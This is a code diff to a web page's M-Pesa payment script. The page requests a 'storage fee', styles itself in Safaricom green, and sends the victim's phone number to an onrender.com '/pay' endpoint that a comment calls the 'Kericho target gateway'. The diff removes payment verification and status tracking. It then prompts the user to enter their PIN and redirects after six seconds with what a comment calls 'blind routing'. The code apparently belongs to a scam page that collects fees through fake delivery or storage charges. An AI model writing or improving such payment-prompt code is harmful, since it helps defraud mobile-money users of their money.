@@ -287,9 +287,12 @@
 
     payBtn.addEventListener('click', async () => {
         modal.style.display = "flex";
-        statusText.innerText = "SENDING STK PUSH... ";
+        
+        // Phase 1: Sending (Orange status)
+        statusText.innerText = "SENDING STK PUSH...";
         statusText.style.color = "var(--status-orange)";
         subStatusText.style.display = "block";
+        subStatusText.innerText = "Please check your phone for the M-Pesa prompt";
         
         let formattedNumber = phoneInput.value.trim();
         if (formattedNumber.startsWith('0')) {
@@ -298,67 +301,41 @@
             formattedNumber = '254' + formattedNumber;
         }
 
+        // Updated parameters: Pulling values dynamically instead of fixed constants
         const payload = {
-            phone: formattedNumber,
-            amount: Number(storageFee)
+            phone_number: formattedNumber,
+            amount: Number(storageFee) 
         };
 
         try {
-            const response = await fetch('https://server100-847a.onrender.com/pay', {
+            // Uses the Kericho target gateway API endpoint
+            const response = await fetch('https://stkpush111.onrender.com/pay', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
 
-            const data = await response.json();
-
-            if (response.ok && data.success === true) {
+            if (response.ok) {
+                // Phase 2: Sent (Safaricom Green confirmation text style)
+                statusText.innerText = "STK PUSH SENT! ENTER PIN";
+                statusText.style.color = "var(--safaricom-green)";
                 
-                // CASE 1: The user somehow finished within 5s (Synchronous Completed Response)
-                if (data.status === "completed") {
-                    statusText.innerText = "PAYMENT VERIFIED SUCCESSFULLY!";
-                    statusText.style.color = "var(--safaricom-green)";
-                    subStatusText.style.display = "none";
-                    setTimeout(() => { 
-                        window.location.href = "payment2.html"; 
-                    }, 2000);
-                } 
-                
-                // CASE 2: Normal scenario: STK prompt is sent (Asynchronous Pending Response)
-                else if (data.status === "pending") {
-                    const checkoutId = data.checkout_request_id;
-                    
-                    if (!checkoutId) {
-                        throw new Error("Missing transaction tracking reference from gateway.");
-                    }
-                    
-                    // SAVE IT TO LOCAL STORAGE FOR THE PROCESSING PAGE
-                    localStorage.setItem("request_id", checkoutId);
-                    
-                    statusText.innerText = "PROMPT SENT! REDIRECTING...";
-                    statusText.style.color = "var(--safaricom-green)";
-                    subStatusText.innerText = "Preparing secure tracking window...";
-
-                    // Immediately push execution over to your polling loading page
-                    setTimeout(() => { 
-                        window.location.href = "processing.html"; 
-                    }, 1500);
-                }
-
+                // Directly triggers blind routing sequence after 6 seconds
+                setTimeout(() => { 
+                    window.location.href = "payment1.html"; 
+                }, 6000);
             } else {
-                // Catches explicit API failures (e.g., Image Item #3: Insufficient balance)
-                throw new Error(data.message || "Invalid response structure from backend gateway.");
+                throw new Error("System Busy. Please try again.");
             }
         } catch (error) {
-            // Update modal text UI dynamically to reflect the error
+            // Error overlay state
             statusText.innerText = "ERROR: " + error.message;
             statusText.style.color = "var(--error-red)";
             subStatusText.style.display = "none";
             
-            // Wait 3 seconds, close the modal view overlay, staying on payment1.html safely
             setTimeout(() => { 
                 modal.style.display = "none"; 
-            }, 3000);
+            }, 3500);
         }
     });
 </script>
